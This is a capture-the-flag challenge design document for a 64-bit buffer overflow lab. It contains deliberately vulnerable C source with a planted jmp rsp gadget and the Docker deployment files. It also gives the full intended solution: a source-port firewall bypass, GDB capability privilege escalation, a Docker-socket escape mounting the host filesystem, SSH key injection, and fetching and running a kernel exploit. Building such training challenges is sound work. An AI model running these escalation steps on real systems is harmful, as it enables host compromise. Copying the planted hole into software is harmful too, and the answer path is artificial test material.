---
title: "BSides 2026 - Buffer Overflow CTF Challenge"
status: deprecated
type: technique
tags: [ctf, bof, rop, jmp-rsp, aslr, privesc, cap-privesc, docker-escape, docker, x64]
phase: exploitation
date_created: 2026-05-09
date_updated: 2026-05-22
sources: [ctf-bsides-buffer-2026-design]
---

# BSides 2026 - BOF CTF Challenge Design

## Overview

64-bit x86-64 Linux buffer overflow challenge delivered via Docker. Participants receive a stripped binary and an IP address.

**Flag format:** `BSIDES{<20 chars a-zA-Z1-9>}`
**Flags:** 4 (bof.txt → docker.txt → user.txt → root_flag binary)

---

## Learning Objectives

| Stage | Skill taught |
|---|---|
| Recon | Source port firewall bypass (`nmap -g 53`) |
| Analysis | `checksec`, `strings`, `objdump`, stripped binary enumeration |
| Exploitation | Cyclic offset, bad char fuzzing, `jmp rsp` ROP gadget, `execve` shellcode via socat |
| Privesc 1 | Linux capability abuse (`cap_setuid/cap_setgid`) |
| Privesc 2 | Docker socket container escape to host filesystem |

---

## Binary Design

### Compilation

```bash
gcc -m64 -fno-stack-protector -z execstack -no-pie -O0 -o adminpanel src.c
strip --strip-all adminpanel
```

| Protection | Status | Reason |
|---|---|---|
| Stack canary | Disabled | Teaching BOF without canary bypass |
| NX / DEP | Disabled (`execstack`) | Shellcode on stack |
| PIE | Disabled (`-no-pie`) | Fixed gadget address despite ASLR |
| ASLR | Enabled (system-wide) | Stack randomized — `jmp rsp` is the bypass |
| Symbols | Stripped | Forces real analysis |

### Stack Layout

```
+------------------+  ← buf (char[64])
|   64 bytes buf   |
+------------------+  ← saved RBP (+64)
|   8 bytes RBP    |
+------------------+  ← saved RIP (+72)  ← overwrite here
|   8 bytes RIP    |
+------------------+  ← NOP sled + shellcode
```

**Offset to RIP: 72 bytes**

### Bad Characters

| Byte | Behaviour |
|---|---|
| `\x0a` | Dropped — newline |
| `\x0d` | Dropped — CR |
| `\x20` | Dropped — space |
| `\x0b` | Dropped — vertical tab (non-obvious) |

`\x00` is NOT a bad char — `read()` handles raw bytes.

### jmp rsp Gadget

Inline asm stub guarantees `FF E4` (`jmp *%rsp`) exists at a fixed address in `.text`:

```c
static void __attribute__((used, noinline)) gadget_stub(void) {
    __asm__ volatile(
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "jmp *%%rsp\n\t"
        "nop\n\t"
        "jmp *%%rsp\n\t"
        ::: "memory");
}
```

Confirmed address: `0x0000000000401210`

### Shellcode approach

Binary runs under socat — `execve("/bin/sh")` shellcode inherits the socket connection. No reverse/bind shell required. `pwntools asm(shellcraft.sh())` produces clean shellcode for this bad char set.

---

## Source Code (`src.c`)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* Decoy strings — mislead static analysis */
static const char *s1 = "auth_token_validator_v2";
static const char *s2 = "security_module_initialized";
static const char *s3 = "validate_session_integrity";
static const char *s4 = "admin_bypass_protection_enabled";

static void sanitize(unsigned char *buf, int len) {
    if (len <= 0) return;
    for (int i = 0; i < len; i++) {
        if (buf[i] == 0x0a || buf[i] == 0x0d || buf[i] == 0x20 || buf[i] == 0x0b)
            buf[i] = 0x00;
    }
}

static void __attribute__((used, noinline)) gadget_stub(void) {
    __asm__ volatile(
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "jmp *%%rsp\n\t"
        "nop\n\t"
        "jmp *%%rsp\n\t"
        ::: "memory");
}

static void auth_key_check(void) {
    char buf[64];
    write(1, "Authentication key: ", 20);
    sanitize((unsigned char *)buf, (int)read(0, buf, 256));  /* BOF */
    write(1, "Access denied\r\n", 15);
}

int main(void) {
    if (s4[0] == '\0') return 1;
    write(1, "=== Auth Gateway v1.3 ===\r\n", 27);
    write(1, "Session module: ", 16);
    write(1, s2, strlen(s2));
    write(1, "\r\n", 2);
    write(1, "Validation routine: ", 20);
    write(1, s3, strlen(s3));
    write(1, "\r\n", 2);
    auth_key_check();
    return 0;
}
```

---

## Privesc Chain

### Stage 1 — Capability Abuse (container root)

`/usr/bin/gdb` given `cap_setuid,cap_setgid+ep` at build time. Player enumerates capabilities with `getcap -r /`, discovers GDB, escalates via GDB's Python bridge.

```bash
getcap -r / 2>/dev/null
# /usr/bin/gdb = cap_setuid,cap_setgid+ep

gdb -nx \
  -ex 'python import os; os.setuid(0); os.setgid(0)' \
  -ex 'shell /bin/bash -p' \
  -ex quit
# uid=0(root) gid=0(root)
```

### Stage 2 — Docker Socket Escape (flag 3: user.txt)

Docker socket mounted into container (`/var/run/docker.sock`). `ctf` user added to `dockersock` group at container startup. From container root, run a new alpine container with host `/` mounted and read `user.txt`.

```bash
docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine sh -c \
    'cat /host/home/ubuntu/user.txt'
```

### Stage 3 — Dirtyfrag LPE (flag 4: root_flag binary)

Flag 4 is a binary at `/root/root_flag` (chmod 700, root:root). It contains the XOR-encoded flag and refuses to run inside any container (checks `/.dockerenv` and cgroup). Requires genuine host root. Path: inject SSH key via docker socket volume mount → SSH as `ubuntu` → compile and run dirtyfrag kernel LPE → root shell → run `/root/root_flag`. gcc is pre-installed on host; players must find the exploit independently.

```bash
# Inject SSH key
docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine sh -c \
    "mkdir -p /host/home/ubuntu/.ssh && \
     echo 'PUBKEY' >> /host/home/ubuntu/.ssh/authorized_keys && \
     chmod 700 /host/home/ubuntu/.ssh && \
     chmod 600 /host/home/ubuntu/.ssh/authorized_keys && \
     chown -R 1000:1000 /host/home/ubuntu/.ssh"

# SSH in as ubuntu, clone + compile dirtyfrag, escalate
ssh ubuntu@<IP>
git clone https://github.com/V4bel/dirtyfrag && cd dirtyfrag
gcc -O0 -Wall -o exp exp.c -lutil && ./exp
/root/root_flag
```

---

## Dockerfile

```dockerfile
FROM ubuntu:20.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y --no-install-recommends \
        gcc libc6-dev libcap2-bin make socat iptables iproute2 python3 gdb docker.io \
    && rm -rf /var/lib/apt/lists/*

RUN useradd -m -s /bin/bash ctf

COPY src.c /tmp/src.c
RUN gcc -m64 -fno-stack-protector -z execstack -no-pie -O0 \
        -o /opt/adminpanel /tmp/src.c \
    && strip --strip-all /opt/adminpanel \
    && chmod 755 /opt/adminpanel \
    && rm /tmp/src.c

RUN setcap cap_setuid,cap_setgid+ep /usr/bin/gdb

ARG BOF_FLAG=CHANGEME_BOF
ARG DOCKER_FLAG=CHANGEME_DOCKER
ARG USER_FLAG=CHANGEME_USER
ARG ROOT_FLAG=CHANGEME_ROOT
RUN printf 'BSIDES{%s}\n' "${BOF_FLAG}" > /home/ctf/bof.txt \
    && printf 'BSIDES{%s}\n' "${DOCKER_FLAG}" > /root/docker.txt \
    && chmod 644 /home/ctf/bof.txt \
    && chmod 600 /root/docker.txt \
    && chown ctf:ctf /home/ctf/bof.txt

COPY start.sh /start.sh
RUN chmod +x /start.sh
EXPOSE 8443
ENTRYPOINT ["/start.sh"]
```

---

## start.sh

```bash
#!/bin/bash
set -euo pipefail
iptables -F INPUT 2>/dev/null || true
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
# Block banned IPs from 8443 for 20s (fixed — rcheck does not refresh timer)
iptables -A INPUT -p tcp --dport 8443 \
    -m recent --name BOFBANNED --rcheck --seconds 20 -j DROP
# Count non-src-53 probes; ban IP after 6 hits in 20s (triggers on default nmap -T3/T4)
iptables -A INPUT -p tcp ! --sport 53 --dport 8443 \
    -m recent --name BOFPROBES --set \
    -m recent --name BOFPROBES --update --seconds 20 --hitcount 6 \
    -m recent --name BOFBANNED --set -j DROP
# Drop under-threshold non-src-53 probes
iptables -A INPUT -p tcp ! --sport 53 --dport 8443 -j DROP
# Accept valid bypass (src port 53, not banned)
iptables -A INPUT -p tcp --sport 53 --dport 8443 -j ACCEPT
echo "[*] firewall up: TCP/8443 reachable only from source port 53 (ban after 6 probes/20s)"

if [[ -S /var/run/docker.sock ]]; then
  SOCK_GID="$(stat -c '%g' /var/run/docker.sock)"
  SOCK_GROUP="$(getent group "${SOCK_GID}" | cut -d: -f1 || true)"
  if [[ -z "${SOCK_GROUP}" ]]; then
    groupadd -g "${SOCK_GID}" dockersock || true
    SOCK_GROUP="dockersock"
  fi
  usermod -aG "${SOCK_GROUP}" ctf || true
fi

chattr +i /home/ctf/bof.txt /root/docker.txt 2>/dev/null || true
rm -f /start.sh
exec su ctf -s /bin/bash -c 'socat TCP-LISTEN:8443,reuseaddr,fork EXEC:/opt/adminpanel'
```

---

## docker-compose.yml

```yaml
services:
  bof-ctf:
    build:
      context: .
      args:
        BOF_FLAG: ${BOF_FLAG}
        DOCKER_FLAG: ${DOCKER_FLAG}
        USER_FLAG: ${USER_FLAG}
        ROOT_FLAG: ${ROOT_FLAG}
    cap_add:
      - NET_ADMIN
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    ports:
      - "8443:8443"
    restart: unless-stopped
```

---

## Files in Container

```
/opt/adminpanel                      ← vulnerable binary
/usr/bin/gdb                         ← cap_setuid,cap_setgid+ep (privesc vector)
/home/ctf/bof.txt                    ← flag 1 (ctf-readable)
/root/docker.txt                     ← flag 2 (root-only)
/var/run/docker.sock                 ← mounted from host
```

## Files on Host

```
/home/ubuntu/user.txt                ← flag 3 (chmod 644, ubuntu)
/root/root_flag                      ← flag 4 (chmod 700, root only, cgroup-gated binary)
```

---

## Deployment Checklist

- [ ] Host has Docker installed and running
- [ ] Host has `docker.io` + `docker-compose-v2`
- [ ] Flags generated fresh (see `deploy.md`)
- [ ] Container has `--cap-add NET_ADMIN` (iptables)
- [ ] Docker socket mounted into container
- [ ] Port `8443` exposed and reachable from participant network
- [ ] Host flags written to `/home/ubuntu/user.txt` and `/root/root_flag` (binary)
- [ ] `adminpanel` binary distributed to participants with IP address only

---

## Potential Improvements

- Add a menu binary variant as a harder alternate version (forces path analysis before overflow)
- Re-introduce `\x40` XOR bad char for extra difficulty
- Add a time-limited hint unlock system tied to flag submission count
- Add second binary with stack canary leak for advanced track

---

## Participant Hint Progression (optional)

| Hint # | Cost | Text |
|---|---|---|
| 1 | 100 pts | "Standard port scans won't reveal anything. Think about what source port DNS servers use." |
| 2 | 100 pts | "Not all bad characters are obvious. Fuzz the full byte range `\x00`–`\xff` locally." |
| 3 | 150 pts | "ASLR is on but the binary isn't position-independent. What does that mean for gadget addresses?" |
| 4 | 200 pts | "After the shell — what capabilities does the helper binary have?" |
